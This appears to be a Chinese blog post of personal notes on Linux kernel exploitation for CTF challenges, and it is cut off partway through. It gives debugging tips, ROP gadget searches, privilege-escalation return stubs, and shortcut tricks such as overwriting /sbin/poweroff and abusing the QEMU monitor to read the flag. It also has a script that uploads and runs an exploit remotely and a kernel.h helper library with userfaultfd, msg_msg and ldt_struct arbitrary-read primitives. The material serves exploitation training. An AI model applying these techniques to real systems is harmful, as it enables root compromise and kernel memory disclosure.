---
layout: post
title: excluded
category: kernel pwn
date: 2024-7-20 14:00:00
exclude: true
---
Linux kernel基础：Kernel 
<!-- more -->

[TOC]



# Q & A

这里用于记录一些`Linux Kernel Pwn`中遇到的各种问题。

## 0x00. 成功执行提权函数，但没有获得root权限的shell

问题表现于如上所示，或者是一些其它的奇怪症状。

可以在`gcc`编译时通过加上编译参数`-Os`，或者例如`-O0`等优化选项都可以试试，推测是由于优化选项带来的问题。

后记：检查一下`system`的`rsp`呢？其实就是栈对齐，用户态`rop`经典问题了。

## 0x01. 断点打不上

首先检查`gdb`是否有`add-symbol-file xxx.ko address`这样设置了，这里不讨论如何打断点，而是考虑在看似一切正常的情况下，打不上断点的情况。

笔者遇到过一次，启动脚本中有一行参数`-enable-kvm`。

将其删掉就好了。

## 0x02. Linux kernel 调试板子

写下笔者自用的`gdb`调试板子和`exp`运行板子。

`gdb`调试板子：

```bash
	"gdb_extended": {
		"prefix": "gdb",
		"body": [
			"#!/bin/bash",
			"",
			"# 定义变量",
			"KERNEL_MODULE=\"${1:}\"",
			"OFFSET=\"${2:}\"",
			"PORT=\"${3:1234}\"",
			"EXPLOIT=\"${4:core/exploit}\"",
			"",
			"# 使用gdb调试",
			"gdb -q \\",
			"    -ex \"add-symbol-file $$KERNEL_MODULE $$OFFSET\" \\",
			"    -ex \"file ./$$KERNEL_MODULE\" \\",
			"    -ex \"file $$EXPLOIT\" \\",
			"    -ex \"target remote:$$PORT\""
		],
		"description": "an extended template for gdb in linux kernel pwn"
	},
```

`exp.sh`调试板子：（编译`exploit`并启动环境）

```bash
	"exp": {
		"prefix": "exp",
		"body": [
			"FILE_NAME=\"${1:core.cpio}\"",
			"BOOT_SCRIPT=\"${2:boot.sh}\"",
			"",
			"gcc -o core/exploit ./exp.c -static -masm=intel -g",
			"cd core",
			"find . | cpio -o --format=newc > ../$$FILE_NAME",
			"cd ..",
			"./$$BOOT_SCRIPT"
		],
		"description": "a template for compiling and creating a cpio archive, then running a boot script"
	}
```

## 0x03. 无法打开/dev/ptmx，无法打开tty_struct结构体

有时候我们无法打开`/dev/ptmx`来获取到`tty_struct`结构体，表现为返回的`fd`为`-1`。

若发现`ls /dev/ptmx`发现该文件存在，而`cat /dev/ptmx`又发现该文件不存在，则说明`rcS`脚本里面，大概率没有挂载`pts`：

```bash
mkdir -p /dev/pts
mount -vt devpts -o gid=4,mode=620 none /dev/pts
```

而`ptmx`在没有挂载该`pts`的时候是无法打开的。这和终端、伪终端有一定关系。

因此，无法打开是出题者刻意为之，此时需要寻找其它的结构体进行利用。

## 0x04. gadgets寻找相关问题

`Linux kernel`中的`gadgets`寻找相较于用户态会麻烦许多，而`ropper`和`ROPgadget`半斤八两。经过笔者测试，还是`ROPgadget`会好用许多（对比之下笔者在用户态更喜欢用`ropper`~）

例如，有的时候会面临，明明有这个`gadget`却寻找不到的问题。此时可以在`ROPgadget`中添加`--depth`参数：

```bash
ROPgadget --binary ./vmlinux --depth=20 > gadgets.txt
```

随后我们可以利用`grep`加上正则表达式快速匹配一些`gadgets`~

要在`grep`中使用正则表达式，可以加上`-E`参数，来支持扩展的正则表达式。

这里总结一些查找`gadget`的常用正则表达式：

```
.    匹配任意单个字符
.*   匹配任意数量的任意字符
^    匹配开头
$    匹配结尾
```

利用上面这些，我们便可以找到一些很难找到的`gadgets`。例如，匹配`add rsp, 0x18`这样的`gadgets`：

```bash
$ cat gadgets.txt| grep -E '.*: pop ... ; pop ... ; pop ... ; ret$'
0xffffffff81053164 : pop r12 ; pop rbp ; pop rbx ; ret
0xffffffff8267b9ab : pop r13 ; pop r14 ; pop rbp ; ret
0xffffffff8267b9ac : pop rbp ; pop r14 ; pop rbp ; ret
0xffffffff8267d549 : pop rbp ; pop rdx ; pop rcx ; ret
0xffffffff8267e408 : pop rbx ; pop rsi ; pop rbp ; ret
0xffffffff8267d6a9 : pop rsi ; pop rdi ; pop rbp ; ret
0xffffffff81053165 : pop rsp ; pop rbp ; pop rbx ; ret
```

如上，我们利用`.*: `匹配了前面地址部分，随后多次使用`pop ...`表示`pop`一个寄存器，最后`ret`后面使用`$`表示匹配结尾。

对于某些难以寻找的`gadget`，还可以尝试使用`pwntools`来进行搜索：

```python
from pwn import *
context(arch = 'amd64', os = 'linux')
elf = ELF('./vmlinux')
for x in elf.search(asm('push rsi; pop rsp;'), executable = True):
    print(elf.disasm(address = x, n_bytes = 0x40))
    print('------------------------------------------------------------------------------------------------------------')
```

其中`n_bytes`为该`gadget`处打印多少长度的`code`。可以根据自己调整。

## 0x05. 内核崩溃时卡死 qemu不退出或重启

注意`qemu`启动脚本中，`-append`的如下选项：

```c
panic=1 oops=panic
```

开启之后即可让内核崩溃时触发`panic`。

而`panic`之后，若设置了`-no-reboot`则不会重启内核。

## 0x06. 通过内核堆上泄露程序基地址

内核堆地址（`page_offset_base`）`+0x9d000`处存放了函数`secondary_startup_64`函数的地址，可以通过该函数地址泄露程序基地址

## 0x07. 寻找modprobe_path地址

我们无法通过`cat /proc/kallsyms`来找到`modprobe_path`的地址。幸运的是，在`__request_module`中，存在一个对`modprobe_path`的引用。由此，我们可以从`/proc/kallsyms`中找到`__request_module`函数的地址，并使用`gdb`连接到`kernel`，查看该函数附近的汇编代码，即可找到`modprobe_path`的地址~

具体如下：

首先我们找到`__request_module`函数的地址：

![QQ_1722493258038](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202408011511350.png)

随后，我们让`gdb`连接到该`kernel`，设置`target remote:1234`即可，通过`x/40i`来查看刚刚获得的函数地址附近的代码：

![QQ_1722493343591](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202408011511409.png)

如上所示，箭头所指的地方就是`modprobe_path`的地址的引用。

通过如上方式，我们就可以获得`modprobe_path`的地址。

## 0x08. 回到用户态起shell的板子

没有开启`kpti`时如下所示：

```c
swapgs
iretq
user_shell_addr // the func that will be execute
user_cs
user_eflags // 64bit:user_rflags
user_sp
user_ss
```

开启时如下所示：

```c
↓   swapgs_restore_regs_and_return_to_usermode + 27
    0 // padding
    0 // padding
    user_shell_addr
    user_cs
    user_rflags
    user_sp
    user_ss
```

**值得注意的是：**

**我们知道`swapgs_restore_regs_and_return_to_usermode`函数需要加上一个偏移，具体来说该偏移不是固定的，需要跳过前面的栈操作，从`mov rdi, rsp`开始即可**

又补充：我的理解是从`mov rdi, rsp`开始，但事实上在做别的例如`0ctf_kernote`打`pt_regs`的时候，发现得从`pop rbp`开始。只能说多试一下。

## 0x09. 非预期

整理一些常见非预期：

- 修改`umount`:

![image-20240928132818409](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202409281328503.png)

- 修改`poweroff`：

```bash
rm /sbin/poweroff
echo "#!/bin/sh" > /sbin/poweroff
echo "/bin/sh" >> /sbin/poweroff
chmod +x /sbin/poweroff
exit
cat flag
```

- 没防止`monitor`：

按下`ctrl+a`，再按`c`，输入：

```bash
migrate "exec:cp rootfs.img /tmp"
migrate "exec:cd /tmp;zcat rootfs.img | cpio -idmv 1>&2"
migrate "exec:cat /tmp/flag 1>&2"
```

## 0x0A. 或许是非预期的内核地址泄露

利用如下命令：

```bash
hexdump -C /sys/kernel/notes
```

可以得到如下形式：

```bash
/ $ hexdump -C /sys/kernel/notes
hexdump -C /sys/kernel/notes
00000000  04 00 00 00 06 00 00 00  06 00 00 00 58 65 6e 00  |............Xen.|
00000010  6c 69 6e 75 78 00 00 00  04 00 00 00 04 00 00 00  |linux...........|
00000020  07 00 00 00 58 65 6e 00  32 2e 36 00 04 00 00 00  |....Xen.2.6.....|
00000030  08 00 00 00 05 00 00 00  58 65 6e 00 78 65 6e 2d  |........Xen.xen-|
00000040  33 2e 30 00 04 00 00 00  08 00 00 00 03 00 00 00  |3.0.............|
00000050  58 65 6e 00 00 00 00 80  ff ff ff ff 04 00 00 00  |Xen.............|
00000060  08 00 00 00 0f 00 00 00  58 65 6e 00 00 00 00 00  |........Xen.....|
00000070  80 00 00 00 04 00 00 00  08 00 00 00 01 00 00 00  |................|
00000080  58 65 6e 00 80 11 be 8a  ff ff ff ff 04 00 00 00  |Xen.............|
00000090  08 00 00 00 02 00 00 00  58 65 6e 00 00 20 20 89  |........Xen..  .|
000000a0  ff ff ff ff 04 00 00 00  29 00 00 00 0a 00 00 00  |........).......|
000000b0  58 65 6e 00 21 77 72 69  74 61 62 6c 65 5f 70 61  |Xen.!writable_pa|
000000c0  67 65 5f 74 61 62 6c 65  73 7c 70 61 65 5f 70 67  |ge_tables|pae_pg|
000000d0  64 69 72 5f 61 62 6f 76  65 5f 34 67 62 00 00 00  |dir_above_4gb...|
000000e0  04 00 00 00 04 00 00 00  11 00 00 00 58 65 6e 00  |............Xen.|
000000f0  01 88 00 00 04 00 00 00  04 00 00 00 09 00 00 00  |................|
00000100  58 65 6e 00 79 65 73 00  04 00 00 00 08 00 00 00  |Xen.yes.........|
00000110  08 00 00 00 58 65 6e 00  67 65 6e 65 72 69 63 00  |....Xen.generic.|
00000120  04 00 00 00 10 00 00 00  0d 00 00 00 58 65 6e 00  |............Xen.|
00000130  01 00 00 00 00 00 00 00  01 00 00 00 00 00 00 00  |................|
00000140  04 00 00 00 04 00 00 00  0e 00 00 00 58 65 6e 00  |............Xen.|
00000150  01 00 00 00 04 00 00 00  04 00 00 00 10 00 00 00  |................|
00000160  58 65 6e 00 01 00 00 00  04 00 00 00 08 00 00 00  |Xen.............|
00000170  0c 00 00 00 58 65 6e 00  00 00 00 00 00 80 ff ff  |....Xen.........|
00000180  04 00 00 00 08 00 00 00  04 00 00 00 58 65 6e 00  |............Xen.|
00000190  00 00 00 00 00 00 00 00  04 00 00 00 14 00 00 00  |................|
000001a0  03 00 00 00 47 4e 55 00  1f 67 72 f8 b7 87 9e 24  |....GNU..gr....$|
000001b0  4c 32 59 6b 38 9e 20 1f  3f 3d c1 c7 06 00 00 00  |L2Yk8. .?=......|
000001c0  01 00 00 00 00 01 00 00  4c 69 6e 75 78 00 00 00  |........Linux...|
000001d0  00 00 00 00                                       |....|
000001d4
```

如下所示，可以获得一个内核基地址。

![image-20241001143005672](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/image-20241001143005672.png)

## 0x0B. tar命令解析

`tar`命令用得很多，其几个参数效果如下：

```bash
-x 对.tar格式打包的文件解包
-c 将文件打包为.tar文件
-v 显示解压过程
-f 指定文件
-z 压缩/解压.gz格式的文件，例如.tar.gz
-J 压缩/解压.xz格式的文件，例如.tar.xz
-j 压缩/解压.bzip2格式的文件，例如.tar.bz2

-C 指定输出路径
```

因此，对于一般`.tar`格式的文件，我们使用如下命令解包：

```bash
tar -xvf ./file.tar
```

使用如下命令对`.gz`格式压缩的文件解压缩：

```bash
tar -xzvf ./file.tar.gz
```

以及可以指定输出路径：

```bash
tar -xzvf ./file.tar.gz -C dir
```



通过如下方式压缩文件：

```bash
tar -cvf ./file.tar file1.txt fil2.txt
```

通过如下方式压缩整个目录：

```bash
tar -czvf ./file.tar dir
```

## 0x0C. ext4格式的文件系统

若题目给出一个`.img`格式的文件，则有可能是`ext4`格式的文件系统，如下所示：

```bash
$ file ./rootfs.img
./rootfs.img: Linux rev 1.0 ext4 filesystem data, UUID=1a11479a-9bca-4c78-ae24-9c9c0b41d9f4 (needs journal recovery) (extents) (64bit) (large files) (huge files)
```

则其解压方式如下：

先在`/mnt`下创建一个文件夹用于存放解压后的文件：

```bash
sudo mkdir -p /mnt/kernote
```

随后使用`mount`命令来挂载即可：

```bash
sudo mount ./rootfs.img /mnt/kernote
```

使用`umount`命令即可自动完成打包并卸载：

```bash
sudo umount /mnt/kernote
```

一个示例的`exp.sh`脚本如下：

```bash
#!/bin/sh

sudo mkdir -p /mnt/kernote
sudo mount ./rootfs.img /mnt/kernote
sudo gcc -o /mnt/kernote/exploit ./exp.c -g -masm=intel -static
sudo umount /mnt/kernote
```

## 0x0D. kmem_cache_alloc_trace函数和其相关

有时候题目不是通过`kmalloc`分配的，而是通过`kmem_cache_alloc_trace`函数。

例如：

```c
kmem_cache_alloc_trace(kmalloc_caches[5], 0xCC0LL, 8LL, v5, -1LL);
```

此时需要注意，**第三个参数**才是分配的大小。

这里记录下几个函数的函数原型：

创建`kmem_cache`：

```c
struct kmem_cache *kmem_cache_create(const char *name, size_t size, size_t align,
                                     unsigned long flags, void (*ctor)(void *));
```

分配`obj`：

```c
void *kmem_cache_alloc(struct kmem_cache *cachep, gfp_t flags);
```

分配`obj`，但会记录信息用于跟踪，例如`size`：

```c
void *kmem_cache_alloc_trace(struct kmem_cache *cachep, gfp_t flags, size_t size);
```

## 0x0E. slub和slab分配器的区别

`emmm`这里只记录一个，就是`slub`分配器最小有`kmalloc-8`（`slob`也是`kmalloc-8`），而`slab`最小即为`32`，即`kmalloc-32`

## 0x0F. 四级页表内存布局

位于[这里](https://elixir.bootlin.com/linux/v6.11.5/source/Documentation/arch/x86/x86_64/mm.rst)，一般看四级的。

![image-20241125152811254](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/imagesimage-20241125152811254.png)

## 0x10. 子进程和父进程使用pipe传输数据

解决了一直一来的一个困惑，使用`pipe`就可以了

示例：

```c
int pipe_fd[2];
size_t value = 8;
pipe(pipe_fd);

// 子进程
write(pipe_fd[1], &value, 8);

// 父进程
read(pipe_fd[0], &value, 8);
```

## 0x11. obj的offset的位置

也就是在`freelist`上指向下一个`obj`的`offset`，笔者一直以为在前`8`字节，但实测和`a3`师傅表示`kmem_cache->offset`位于一个偏移处，甚至大于`0x10`。

## 0x12. 使用read_ldt等搜索内存找到flag

在`qemu`使用`-initrd`导入文件系统时，整个文件系统的内容都位于内存中。

所以用`ext4`格式的就不能这样搜索。因为`qemu`会使用`-hda`来引导该文件系统。

## 0x13. 打远程板子

```python
from pwn import *
import base64
#context.log_level = "debug"

with open("./core/exploit", "rb") as f:
    exp = base64.b64encode(f.read())

p = remote("127.0.0.1", 11451)
#p = process('./run.sh')
try_count = 1
while True:
    p.sendline()
    p.recvuntil("/ $")

    count = 0
    for i in range(0, len(exp), 0x200):
        p.sendline("echo -n \"" + exp[i:i + 0x200].decode() + "\" >> /tmp/b64_exp")
        count += 1
        log.info("count: " + str(count))

    for i in range(count):
        p.recvuntil("/ $")
    
    p.sendline("cat /tmp/b64_exp | base64 -d > /tmp/exploit")
    p.sendline("chmod +x /tmp/exploit")
    p.sendline("/tmp/exploit ")
    break

p.interactive()
```

## 0x14. 生成带符号的 vmlinux

可以通过 `vmlinux-to-elf`  [工具](https://github.com/marin-m/vmlinux-to-elf/tree/master)，使用方式如下：

```bash
vmlinux-to-elf ./vmlinux vmlinux_symbol
```

随后，便可以使用 `ida` 等工具静态分析输出的带符号的`elf`。

## 0x15. 找不到 init_cred 时如何处理

通过`0x14`的方式生成带符号的`elf`。随后，找到`prepare_kernel_creds`函数，如下：

![image-20250103151604797](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/imagesimage-20250103151604797.png)

只需要找形如如上的`else`分支中的变量，该变量即为 `init_cred` ，使用其地址即可。

## 0x16. 让编译器不要对某个函数进行任何优化

使用`__attribute__((naked))`即可，如下：

```c

__attribute__((naked)) long simple_clone(int flags, int (*fn)(void *))
{
    /* for syscall, it's clone(flags, stack, ...) */
    __asm__ volatile (
        " mov r15, rsi; "   /* save the rsi*/
        " xor rsi, rsi; "   /* set esp and useless args to NULL */
        " xor rdx, rdx; "
        " xor r10, r10; "
        " xor r8, r8;   "
        " xor r9, r9;   "
        " mov rax, 56;  "   /* __NR_clone */
        " syscall;      "
        " cmp rax, 0;   "
        " je child_fn;  "
        " ret;          "   /* parent */
        "child_fn:      "
        " jmp r15;      "   /* child */
    );
}
```



## 0xFF. 内核保护配置记录

```bash
CONFIG_SLAB=y 使用SLAB而不是SLUB
CONFIG_SLUB=y 使用SLUB而不是SLAB
CONFIG_SLAB_FREELIST_RANDOM=y 开启Random Freelist
CONFIG_SLAB_FREELIST_HARDENED=y 开启Hardened Freelist
CONFIG_HARDENED_USERCOPY=y 开启Hardened Usercopy
CONFIG_STATIC_USERMODEHELPER=y 开启Static Usermodehelper Path（modprobe_path 为只读，不可修改）
CONFIG_STATIC_USERMODEHELPER_PATH=""
CONFIG_MEMCG_KMEM=y 不同flags标志的obj将会隔离
```

`rcS`中：

```bash
echo 1 > /proc/sys/kernel/dmesg_restrict  # 普通用户无法访问dmesg
echo 0 > /proc/sys/kernel/dmesg_restrict  # 普通用户可以访问dmesg

echo 0 > /proc/sys/kernel/kptr_restrict # 普通用户可以访问/proc/kallsyms
echo 1 > /proc/sys/kernel/kptr_restrict # 只有root可以访问/proc/kallsyms
echo 2 > /proc/sys/kernel/kptr_restrict # 任何用户都不可以访问/proc/kallsyms
```



# 笔者自用kernel.h模板（到处抄的）

```c
#ifndef LTFALLKERNEL_H
#define LTFALLKERNEL_H

#define _GNU_SOURCE

#include <stdio.h>
#include <stdarg.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <poll.h>
#include <stdint.h>
#include <sys/syscall.h>
#include <sys/xattr.h>
#include <errno.h>
#include <sched.h>
#include <sys/types.h>
#include <fcntl.h>
#include <signal.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/sem.h>
#include <sys/socket.h>
// #include <asm/ldt.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/wait.h>
#include <semaphore.h>

/**
 * 0x00. 基本函数
 */

size_t user_cs, user_ss, user_rflags, user_sp;
size_t kernel_base = 0xffffffff81000000, kernel_offset = -1;

/**
 * @ show basic information
 */

void leak_info(char *content, size_t value)
{
    success("%s => 0x%llx.", content, value);
}

void info(const char *format, ...)
{
    va_list args;
    va_start(args, format);
    printf("%s", "\033[34m\033[1m[*] ");
    vprintf(format, args);
    printf("%s", "\033[0m\n");
}

void success(const char *format, ...)
{
    va_list args;
    va_start(args, format);
    printf("%s", "\033[32m\033[1m[+] ");
    vprintf(format, args);
    printf("%s", "\033[0m\n");
}

void error(const char *format, ...)
{
    va_list args;
    va_start(args, format);
    printf("%s", "\033[31m\033[1m[x] ");
    vprintf(format, args);
    printf("%s", "\033[0m\n");
}

void save_status()
{
    asm volatile(
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;");
    info("Status has been saved.");
}

void get_root_shell(void)
{
    if (getuid())
    {
        error("Failed to get the root!");
        exit(-1);
    }

    success("Successful to get the root. Execve root shell now...");
    system("/bin/sh");

    exit(0);
}

void err_exit(char *buf)
{
    error(buf);
    exit(0);
}

void bind_core(int core)
{
    cpu_set_t cpu_set;

    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

    info("Process binded to core %d.", core);
}

/**
 * 0x01. userfaultfd相关
 * 本部分全部抄自于arttnba3师傅
 */

/**
 * The MUSL also doesn't contain `userfaultfd.h` :(
 * Luckily we just need a bit of micros in exploitation,
 * so just define them directly is okay :)
 */

#define UFFD_API ((uint64_t)0xAA)
#define _UFFDIO_REGISTER (0x00)
#define _UFFDIO_COPY (0x03)
#define _UFFDIO_API (0x3F)

/* userfaultfd ioctl ids */
#define UFFDIO 0xAA
#define UFFDIO_API _IOWR(UFFDIO, _UFFDIO_API, \
                         struct uffdio_api)
#define UFFDIO_REGISTER _IOWR(UFFDIO, _UFFDIO_REGISTER, \
                              struct uffdio_register)
#define UFFDIO_COPY _IOWR(UFFDIO, _UFFDIO_COPY, \
                          struct uffdio_copy)

/* read() structure */
struct uffd_msg
{
    uint8_t event;

    uint8_t reserved1;
    uint16_t reserved2;
    uint32_t reserved3;

    union
    {
        struct
        {
            uint64_t flags;
            uint64_t address;
            union
            {
                uint32_t ptid;
            } feat;
        } pagefault;

        struct
        {
            uint32_t ufd;
        } fork;

        struct
        {
            uint64_t from;
            uint64_t to;
            uint64_t len;
        } remap;

        struct
        {
            uint64_t start;
            uint64_t end;
        } remove;

        struct
        {
            /* unused reserved fields */
            uint64_t reserved1;
            uint64_t reserved2;
            uint64_t reserved3;
        } reserved;
    } arg;
} __attribute__((packed));

#define UFFD_EVENT_PAGEFAULT 0x12

struct uffdio_api
{
    uint64_t api;
    uint64_t features;
    uint64_t ioctls;
};

struct uffdio_range
{
    uint64_t start;
    uint64_t len;
};

struct uffdio_register
{
    struct uffdio_range range;
#define UFFDIO_REGISTER_MODE_MISSING ((uint64_t)1 << 0)
#define UFFDIO_REGISTER_MODE_WP ((uint64_t)1 << 1)
    uint64_t mode;
    uint64_t ioctls;
};

struct uffdio_copy
{
    uint64_t dst;
    uint64_t src;
    uint64_t len;
#define UFFDIO_COPY_MODE_DONTWAKE ((uint64_t)1 << 0)
    uint64_t mode;
    int64_t copy;
};

// #include <linux/userfaultfd.h>

char temp_page_for_stuck[0x1000];

void register_userfaultfd(pthread_t *monitor_thread, void *addr,
                          unsigned long len, void *(*handler)(void *))
{
    long uffd;
    struct uffdio_api uffdio_api;
    struct uffdio_register uffdio_register;
    int s;

    /* Create and enable userfaultfd object */
    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if (uffd == -1)
    {
        err_exit("userfaultfd");
    }

    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;
    if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
    {
        err_exit("ioctl-UFFDIO_API");
    }

    uffdio_register.range.start = (unsigned long)addr;
    uffdio_register.range.len = len;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
    {
        err_exit("ioctl-UFFDIO_REGISTER");
    }

    s = pthread_create(monitor_thread, NULL, handler, (void *)uffd);
    if (s != 0)
    {
        err_exit("pthread_create");
    }
}

void *uffd_handler_for_stucking_thread(void *args)
{
    struct uffd_msg msg;
    int fault_cnt = 0;
    long uffd;

    struct uffdio_copy uffdio_copy;
    ssize_t nread;

    uffd = (long)args;

    for (;;)
    {
        struct pollfd pollfd;
        int nready;
        pollfd.fd = uffd;
        pollfd.events = POLLIN;
        nready = poll(&pollfd, 1, -1);

        if (nready == -1)
        {
            err_exit("poll");
        }

        nread = read(uffd, &msg, sizeof(msg));

        /* just stuck there is okay... */
        sleep(100000000);

        if (nread == 0)
        {
            err_exit("EOF on userfaultfd!\n");
        }

        if (nread == -1)
        {
            err_exit("read");
        }

        if (msg.event != UFFD_EVENT_PAGEFAULT)
        {
            err_exit("Unexpected event on userfaultfd\n");
        }

        uffdio_copy.src = (unsigned long long)temp_page_for_stuck;
        uffdio_copy.dst = (unsigned long long)msg.arg.pagefault.address &
                          ~(0x1000 - 1);
        uffdio_copy.len = 0x1000;
        uffdio_copy.mode = 0;
        uffdio_copy.copy = 0;
        if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
        {
            err_exit("ioctl-UFFDIO_COPY");
        }

        return NULL;
    }
}

void register_userfaultfd_for_thread_stucking(pthread_t *monitor_thread,
                                              void *buf, unsigned long len)
{
    register_userfaultfd(monitor_thread, buf, len,
                         uffd_handler_for_stucking_thread);
}

/**
 * 0x02. keyctl相关
 * 本部分仍然就是摘录于arttnba3师傅的博客
 */

#define KEY_SPEC_PROCESS_KEYRING -2 /* - key ID for process-specific keyring */
#define KEYCTL_UPDATE 2             /* update a key */
#define KEYCTL_REVOKE 3             /* revoke a key */
#define KEYCTL_UNLINK 9             /* unlink a key from a keyring */
#define KEYCTL_READ 11              /* read a key or keyring's contents */

int key_alloc(char *description, void *payload, size_t plen)
{
    return syscall(__NR_add_key, "user", description, payload, plen,
                   KEY_SPEC_PROCESS_KEYRING);
}

int key_update(int keyid, void *payload, size_t plen)
{
    return syscall(__NR_keyctl, KEYCTL_UPDATE, keyid, payload, plen);
}

int key_read(int keyid, void *buffer, size_t buflen)
{
    return syscall(__NR_keyctl, KEYCTL_READ, keyid, buffer, buflen);
}

int key_revoke(int keyid)
{
    return syscall(__NR_keyctl, KEYCTL_REVOKE, keyid, 0, 0, 0);
}

int key_unlink(int keyid)
{
    return syscall(__NR_keyctl, KEYCTL_UNLINK, keyid, KEY_SPEC_PROCESS_KEYRING);
}

/**
 * 0x03. msg_msg相关
 * 本部分仍然就是摘录于arttnba3师傅的博客
 */

#ifndef MSG_COPY
#define MSG_COPY 040000
#endif

struct list_head
{
    uint64_t next;
    uint64_t prev;
};

struct msg_msg
{
    struct list_head m_list;
    uint64_t m_type;
    uint64_t m_ts;
    uint64_t next;
    uint64_t security;
};

struct msg_msgseg
{
    uint64_t next;
};

// struct msgbuf {
//     long mtype;
//     char mtext[1];
// };

int get_msg_queue(void)
{
    return msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
}

int read_msg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
    return msgrcv(msqid, msgp, msgsz, msgtyp, 0);
}

/**
 * the msgp should be a pointer to the `struct msgbuf`,
 * and the data should be stored in msgbuf.mtext
 */
int write_msg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
    ((struct msgbuf *)msgp)->mtype = msgtyp;
    return msgsnd(msqid, msgp, msgsz, 0);
}

/* for MSG_COPY, `msgtyp` means to read no.msgtyp msg_msg on the queue */
int peek_msg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
    return msgrcv(msqid, msgp, msgsz, msgtyp,
                  MSG_COPY | IPC_NOWAIT | MSG_NOERROR);
}

void build_msg(struct msg_msg *msg, uint64_t m_list_next, uint64_t m_list_prev,
               uint64_t m_type, uint64_t m_ts, uint64_t next, uint64_t security)
{
    msg->m_list.next = m_list_next;
    msg->m_list.prev = m_list_prev;
    msg->m_type = m_type;
    msg->m_ts = m_ts;
    msg->next = next;
    msg->security = security;
}

/**
 * 0x04. ldt_struct相关
 * 本部分仍然就是摘录于arttnba3师傅的博客
 */

/**
 * Somethings we may want to compile the exp binary with MUSL-GCC, which
 * doesn't contain the `asm/ldt.h` file.
 * As the file is small, I copy that directly to here :)
 */

/* Maximum number of LDT entries supported. */
#define LDT_ENTRIES 8192
/* The size of each LDT entry. */
#define LDT_ENTRY_SIZE 8

#ifndef __ASSEMBLY__
/*
 * Note on 64bit base and limit is ignored and you cannot set DS/ES/CS
 * not to the default values if you still want to do syscalls. This
 * call is more for 32bit mode therefore.
 */
struct user_desc
{
    unsigned int entry_number;
    unsigned int base_addr;
    unsigned int limit;
    unsigned int seg_32bit : 1;
    unsigned int contents : 2;
    unsigned int read_exec_only : 1;
    unsigned int limit_in_pages : 1;
    unsigned int seg_not_present : 1;
    unsigned int useable : 1;
#ifdef __x86_64__
    /*
     * Because this bit is not present in 32-bit user code, user
     * programs can pass uninitialized values here.  Therefore, in
     * any context in which a user_desc comes from a 32-bit program,
     * the kernel must act as though lm == 0, regardless of the
     * actual value.
     */
    unsigned int lm : 1;
#endif
};

#define MODIFY_LDT_CONTENTS_DATA 0
#define MODIFY_LDT_CONTENTS_STACK 1
#define MODIFY_LDT_CONTENTS_CODE 2

#endif /* !__ASSEMBLY__ */

/* this should be referred to your kernel */
#define SECONDARY_STARTUP_64 0xffffffff81000060

/* desc initializer */
static inline void init_desc(struct user_desc *desc)
{
    /* init descriptor info */
    desc->base_addr = 0xff0000;
    desc->entry_number = 0x8000 / 8;
    desc->limit = 0;
    desc->seg_32bit = 0;
    desc->contents = 0;
    desc->limit_in_pages = 0;
    desc->lm = 0;
    desc->read_exec_only = 0;
    desc->seg_not_present = 0;
    desc->useable = 0;
}

/**
 * @brief burte-force hitting page_offset_base by modifying ldt_struct
 *
 * @param ldt_cracker function to make the ldt_struct modifiable
 * @param cracker_args args of ldt_cracker
 * @param ldt_momdifier function to modify the ldt_struct->entries
 * @param momdifier_args args of ldt_momdifier
 * @param burte_size size of each burte-force hitting
 * @return size_t address of page_offset_base
 */
size_t ldt_guessing_direct_mapping_area(void *(*ldt_cracker)(void *),
                                        void *cracker_args,
                                        void *(*ldt_momdifier)(void *, size_t),
                                        void *momdifier_args,
                                        uint64_t burte_size)
{
    struct user_desc desc;
    uint64_t page_offset_base = 0xffff888000000000;
    uint64_t temp;
    char *buf;
    int retval;

    /* init descriptor info */
    init_desc(&desc);

    /* make the ldt_struct modifiable */
    ldt_cracker(cracker_args);
    syscall(SYS_modify_ldt, 1, &desc, sizeof(desc));

    /* leak kernel direct mapping area by modify_ldt() */
    while (1)
    {
        ldt_momdifier(momdifier_args, page_offset_base);
        retval = syscall(SYS_modify_ldt, 0, &temp, 8);
        if (retval > 0)
        {
            break;
        }
        else if (retval == 0)
        {
            printf("[x] no mm->context.ldt!");
            page_offset_base = -1;
            break;
        }
        page_offset_base += burte_size;
    }

    return page_offset_base;
}

/**
 * @brief read the contents from a specific kernel memory.
 * Note that we should call ldtGuessingDirectMappingArea() firstly,
 * and the function should be used in that caller process
 *
 * @param ldt_momdifier function to modify the ldt_struct->entries
 * @param momdifier_args args of ldt_momdifier
 * @param addr address of kernel memory to read
 * @param res_buf buf to be written the data from kernel memory
 */
void ldt_arbitrary_read(void *(*ldt_momdifier)(void *, size_t),
                        void *momdifier_args, size_t addr, char *res_buf)
{
    static char buf[0x8000];
    struct user_desc desc;
    uint64_t temp;
    int pipe_fd[2];

    /* init descriptor info */
    init_desc(&desc);

    /* modify the ldt_struct->entries to addr */
    ldt_momdifier(momdifier_args, addr);

    /* read data by the child process */
    pipe(pipe_fd);
    if (!fork())
    {
        /* child */
        syscall(SYS_modify_ldt, 0, buf, 0x8000);
        write(pipe_fd[1], buf, 0x8000);
        exit(0);
    }
    else
    {
        /* parent */
        wait(NULL);
        read(pipe_fd[0], res_buf, 0x8000);
    }

    close(pipe_fd[0]);
    close(pipe_fd[1]);
}

/**
 * @brief seek specific content in the memory.
